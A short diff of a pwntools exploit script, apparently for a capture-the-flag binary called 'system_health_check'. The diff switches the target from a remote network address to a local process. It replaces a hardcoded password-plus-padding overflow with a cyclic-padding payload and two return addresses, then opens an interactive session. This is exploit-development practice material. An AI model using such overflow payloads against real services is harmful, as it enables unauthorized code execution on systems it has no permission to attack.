@@ -1,14 +1,16 @@
 from pwn import *
 
-p = remote("192.168.178.95", 1024)
+#p = remote("127.0.0.1", 1024)
+p = process('./system_health_check')
 print(p.recvline())
 
 raw_input("attach gdb")
 
-padding = "A"*cyclic_find("aclaacma")
-RET = p64(0x401016)
-RIP = p64(0x401254)
+#p.sendline(cyclic(0xff+0xff))
+payload = cyclic(cyclic_find("qaac"))
+payload += p64(0x4012f3)
+payload += p64(0x4012f4)
 
-p.sendline("sUp3r_S3cr3T_P4s5w0rD\x00"+padding+RET+RIP)
+p.sendline(payload)
 
 p.interactive()
